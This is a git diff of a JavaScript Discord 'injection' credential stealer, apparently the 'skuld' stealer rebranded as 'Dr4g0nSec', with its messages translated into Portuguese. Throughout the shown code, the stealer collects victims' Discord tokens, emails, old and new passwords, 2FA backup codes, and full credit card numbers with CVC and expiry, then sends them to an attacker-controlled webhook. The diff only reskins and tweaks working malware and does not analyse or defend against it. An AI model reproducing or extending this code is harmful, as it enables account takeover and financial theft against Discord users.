@@ -147,8 +147,8 @@ const request = async (method, url, headers, data) => {
 
 const hooker = async (content, token, account) => {
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
-    content["username"] = "skuld - cord injection";
-    content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
+    content["username"] = "Dr4g0nSec - Injection";
+    content["avatar_url"] = "https://i.imgur.com/83uCFZe.jpeg";
     content["embeds"][0]["author"] = {
         "name": account.username,
     };
@@ -156,10 +156,10 @@ const hooker = async (content, token, account) => {
         "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
     };
     content["embeds"][0]["footer"] = {
-        "text": "skuld discord injection - made by hackirby",
-        "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
+        "text": "Created by sk4rty | Dr4g0nSec on Top!",
+        "icon_url": "https://avatars.githubusercontent.com/u/150484081?v=4",
     };
-    content["embeds"][0]["title"] = "Account Information";
+    content["embeds"][0]["title"] = "Informações da conta";
 
     const nitro = getNitro(account.premium_type);
     const badges = getBadges(account.flags);
@@ -181,21 +181,21 @@ const hooker = async (content, token, account) => {
         "value": badges,
         "inline": true
     }, {
-        "name": "Billing",
+        "name": "Cobrança",
         "value": billing,
         "inline": true
     });
 
     content["embeds"].push({
-        "title": `Total Friends: ${friends.totalFriends}`,
+        "title": `Amigos totais: ${friends.totalFriends}`,
         "description": friends.message,
     }, {
-        "title": `Total Servers: ${servers.totalGuilds}`,
+        "title": `Servidores totais: ${servers.totalGuilds}`,
         "description": servers.message,
     });
 
     for (const embed in content["embeds"]) {
-        content["embeds"][embed]["color"] = 0xb143e3;
+        content["embeds"][embed]["color"] = 0x250e80;
     }
 
     await request("POST", CONFIG.webhook, {
@@ -261,7 +261,7 @@ const getBilling = async token => {
                     billing += '💳 ';
                     break;
                 case 2:
-                    billing += '<:paypal:1148653305376034967> ';
+                    billing += '<:PayPal:1386523562504097862> ';
                     break;
             }
         }
@@ -279,11 +279,11 @@ const getFriends = async token => {
     for (const acc of filteredFriends) {
         var badges = getRareBadges(acc.user.public_flags)
         if (badges != "") {
-            if (!rareUsers) rareUsers = "**Rare Friends:**\n";
+            if (!rareUsers) rareUsers = "**Amigos raros:**\n";
             rareUsers += `${badges} ${acc.user.username}\n`;
         }
     }
-    rareUsers = rareUsers || "**No Rare Friends**";
+    rareUsers = rareUsers || "**Sem amigos raros**";
 
     return {
         message: rareUsers,
@@ -294,16 +294,20 @@ const getFriends = async token => {
 const getServers = async token => {
     const guilds = await fetchServers(token);
 
-    const filteredGuilds = guilds.filter((guild) => guild.permissions == '562949953421311' || guild.permissions == '2251799813685247');
+    const filteredGuilds = guilds.filter((guild) =>
+        (guild.permissions == '562949953421311' || guild.permissions == '2251799813685247') &&
+        guild.approximate_member_count >= 10
+    );
+
     let rareGuilds = "";
     for (const guild of filteredGuilds) {
         if (rareGuilds === "") {
-            rareGuilds += `**Rare Servers:**\n`;
+            rareGuilds += `**Servidores raros:**\n`;
         }
-        rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
+        rareGuilds += `${guild.owner ? "<:coroa:1386529927469207623> Owner" : "<:coroa1:1386529925564989460> Admin"} | Nome do servidor: \`${guild.name}\` - Membros: \`${guild.approximate_member_count}\`\n`;
     }
 
-    rareGuilds = rareGuilds || "**No Rare Servers**";
+    rareGuilds = rareGuilds || "**Sem servidores raros com 50+ membros**";
 
     return {
         message: rareGuilds,
@@ -311,11 +315,12 @@ const getServers = async token => {
     };
 };
 
+
 const EmailPassToken = async (email, password, token, action) => {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": `**${account.username}** just ${action}!`,
+        "content": `**${account.username}** apenas ${action}!`,
         "embeds": [{
             "fields": [{
                 "name": "Email",
@@ -344,7 +349,7 @@ const BackupCodesViewed = async (codes, token) => {
         message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
     }
     const content = {
-        "content": `**${account.username}** just viewed his 2FA backup codes!`,
+        "content": `**${account.username}** acabei de ver seus códigos de backup 2FA!`,
         "embeds": [{
             "fields": [{
                     "name": "Backup Codes",
@@ -372,7 +377,7 @@ const PasswordChanged = async (newPassword, oldPassword, token) => {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": `**${account.username}** just changed his password!`,
+        "content": `**${account.username}** acabou de mudar a senha dele!`,
         "embeds": [{
             "fields": [{
                 "name": "New Password",
@@ -393,7 +398,7 @@ const CreditCardAdded = async (number, cvc, month, year, token) => {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": `**${account.username}** just added a credit card!`,
+        "content": `**${account.username}** acabou de adicionar um cartão de crédito!`,
         "embeds": [{
             "fields": [{
                 "name": "Number",
@@ -418,7 +423,7 @@ const PaypalAdded = async (token) => {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
+        "content": `**${account.username}** acabou de adicionar uma conta <:PayPal:1386523562504097862>!`,
         "embeds": [{
             "fields": [{
                 "name": "Email",
@@ -465,7 +470,7 @@ async function initiation() {
         const account = await fetchAccount(token)
 
         const content = {
-            "content": `**${account.username}** just got injected!`,
+            "content": `**${account.username}** acabei de ser injetado!`,
 
             "embeds": [{
                 "fields": [{
